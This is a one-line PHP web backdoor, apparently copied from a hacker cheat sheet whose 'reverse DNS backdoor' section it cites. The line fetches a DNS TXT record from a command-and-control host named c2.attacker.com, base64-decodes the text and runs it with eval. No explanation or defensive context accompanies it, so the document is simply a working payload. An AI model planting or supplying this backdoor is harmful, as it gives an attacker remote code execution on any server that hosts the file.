<!--
source: https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet?tab=readme-ov-file#reverse-dns-backdoor
-->
<?php eval(base64_decode(dns_get_record("c2.attacker.com", DNS_TXT)[0]['txt']));?>
